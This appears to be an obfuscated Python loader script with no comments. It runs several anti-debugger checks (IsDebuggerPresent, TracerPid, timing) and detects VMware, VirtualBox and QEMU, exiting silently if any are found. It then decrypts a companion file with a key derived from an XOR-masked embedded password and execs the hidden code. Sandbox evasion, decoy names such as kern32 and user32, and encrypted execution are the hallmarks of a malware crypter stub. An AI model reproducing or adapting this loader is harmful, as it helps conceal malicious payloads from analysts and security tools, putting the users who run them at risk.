#!/usr/bin/env python3
import sys,os,hashlib,hmac,base64,platform,time
from pathlib import Path as _P

_rd=lambda x:__import__("base64").b64decode(x)
_do=lambda a,b:__import__("hmac").compare_digest(a,b)
def _kx(p,s,n):return __import__("hashlib").pbkdf2_hmac("sha512",p,s,n,dklen=64)

DN=["cye_os","chfd_ofc2","scr_dat","main_os","sys_dll","kern32","user32","advapi"]
OB1=bytes([0x5a,0x3f,0x8e,0x2d,0x4b,0xc7,0x91,0x6a,0x1e,0x5d,0x2f,0x8c,0x43,0xb9,0x76,0x2a,0x9f,0x4e,0xc3,0x18,0x7d,0x2c,0x9a,0x5b,0x34,0x8f,0x2e,0x7b,0x4c,0xd1,0x86,0x3b])
OB2=bytes([0x2f,0x7c,0x4a,0xe9,0x1b,0x58,0xd3,0x6f,0x8a,0xb2,0x4e,0xc5,0x91,0x3d,0x7f,0x2a,0xe8,0x4b,0x9c,0x1f,0x6d,0xa3,0x5e,0x8f,0x2c,0xb7,0x4a,0xd1,0x7e,0x93,0x6b,0xc2])
AH="b0a4fccd5003de44f690d0ae1057805a013bca669ea57bb21752ce46feb0c579f297b28b1f884504bfd38e88d796b48564fc6eb24a876dbe4a0c0b4ebf9d5b82"
AH_RAW="sKT8zVAD3kT2kNCuEFeAWgE7ymaepXuyF1LORv6wxXnyl7KLH4hFBL/TjojXlrSFZPxuskqHbb5KDAtOv51bgg=="

class E(Exception):pass
class E1(E):pass
class E3(E):pass
class E4(E):pass
class E5(E):pass

def _xr(d,k):
    r=bytearray(d)
    for rn in range(15,-1,-1):
        ks=__import__("hashlib").sha512(k+bytes([rn])).digest()
        for i in range(len(r)):
            r[i]^=ks[i%len(ks)]
    return bytes(r)

def _chkd():
    try:
        if sys.gettrace():return True
    except:pass
    return False

def _chkp():
    r=[]
    try:
        if platform.system()=="Windows":
            import ctypes
            try:
                if ctypes.windll.kernel32.IsDebuggerPresent():r.append(1)
            except:pass
        elif platform.system() in("Linux","Darwin","FreeBSD","Android"):
            try:
                with open("/proc/self/status","rb")as f:
                    if b"TracerPid:\t0"not in f.read():r.append(1)
            except:pass
    except:pass
    return r

def _chkv():
    r=[]
    try:
        if platform.system()=="Windows":
            import ctypes
            try:
                h=ctypes.windll.kernel32.OpenProcess(0x1000,0,os.getpid())
                if h:
                    v=ctypes.c_int(0)
                    ctypes.windll.kernel32.CheckRemoteDebuggerPresent(h,ctypes.byref(v))
                    ctypes.windll.kernel32.CloseHandle(h)
                    if v.value:r.append(1)
            except:pass
    except:pass
    return r

def _chkt():
    r=[]
    try:
        t1=time.perf_counter()
        for _ in range(50000):pass
        if time.perf_counter()-t1>0.3:r.append(1)
    except:pass
    return r

def _chke():
    r=[]
    vm=["vmware","virtualbox","qemu","kvm","parallels","hyperv"]
    try:
        if platform.system()=="Linux":
            with open("/proc/cpuinfo","rb")as f:
                c=f.read().lower()
                for v in vm:
                    if v.encode()in c:r.append(1)
        elif platform.system()=="Windows":
            import ctypes
            cs=ctypes.windll.kernel32.CreateFileA(b"\\\\.\\VBoxMiniRdrDN",0,0,None,3,0,None)
            if cs!=-1:
                ctypes.windll.kernel32.CloseHandle(cs)
                r.append(1)
    except:pass
    return r

def _blk():
    try:
        if _chkd()or _chkp()or _chkv()or _chkt()or _chke():return True
    except:pass
    return False

def _gpth():return str(_P(__file__).parent.resolve())
def _gnm():return _P(__file__).stem.replace("_run","").replace("_x","")
def _lfs():p=_gpth();n=_gnm();return[_P(p)/(n+DN[0])]

TK="29QzKJhsGKEOXdFugrECefZA3Uckf0wxS6koddrUEpwy3lnPBzDLSHXz1ydfqvv5lGZ68slepL/xKyuFPhymKLCk/M1QA95E9pDQrhBXgFoBO8pmnqV7shdSzkb+sMV58peyix+IRQS/046I15a0hWT8brJKh22+SgwLTr+dW4I="
OP="vhFQ4EIlqP8FcDJB4y3WGF7wIrdsFknuMFH7WhAppeNPShA+jG89oBu/hnbwpQ5KHpoh9WsK0Sr6XtIlpRThDq0uB/sYf/GkXi4vW/l7jUNfqX73LQkZ425e6BtPK+S+XBtJeo4ja+YH4IYmoqEIS0KPc6gqCsss60vdI6UH+R+rNU33WTmu6B9qJFr5NswDX+o7tm0IWe8uQfpbDjmk805aCT+cbi2mGv/HO7DkSApfnT7pahjWK/pZwj+kC+Y="

def _proc():
    if _blk():E5("Detected");os._exit(5)
    fs=_lfs()
    for f in fs:
        if not f.exists():E1("Missing: "+f.name);os._exit(1)
    try:
        dc=b"".join([f.read_bytes()for f in fs])
    except:
        E1("Load error");os._exit(1)
    try:
        d=_rd(OP);l=d[0];pw=bytes(d[i+1]^(OB1+OB2)[i%len(OB1+OB2)]for i in range(l)).decode()
    except:
        E3("Auth init");os._exit(3)
    try:
        dt=_rd(TK)
    except:
        E4("Token invalid");os._exit(4)
    if len(dt)!=128:E4("Token error");os._exit(4)
    s1,vs,ph=dt[:32],dt[32:64],dt[64:]
    if not _do(ph,_rd(AH_RAW)):E3("Auth failed");os._exit(3)
    ek=_kx(pw.encode(),s1,1000000)[:64]
    try:
        dc=_xr(dc,ek+vs)
    except:
        E3("Decrypt failed");os._exit(3)
    try:
        code=dc.decode("utf-8")
    except:
        E1("Decode error");os._exit(1)
    try:
        c=compile(code,"<exec>","exec")
        g={"__name__":"__main__","__file__":__file__}
        exec(c,g)
        for k in list(g.keys()):
            if k not in("__name__","__file__"):
                try:del g[k]
                except:pass
    except SystemExit:raise
    except SyntaxError:E4("Code error");os._exit(4)
    except:E("Exec error");os._exit(6)

if __name__=="__main__":
    try:_proc()
    except E1:sys.exit(1)
    except E3:sys.exit(3)
    except E4:sys.exit(4)
    except E5:sys.exit(5)
    except E:sys.exit(6)
    except SystemExit as e:sys.exit(e.code)
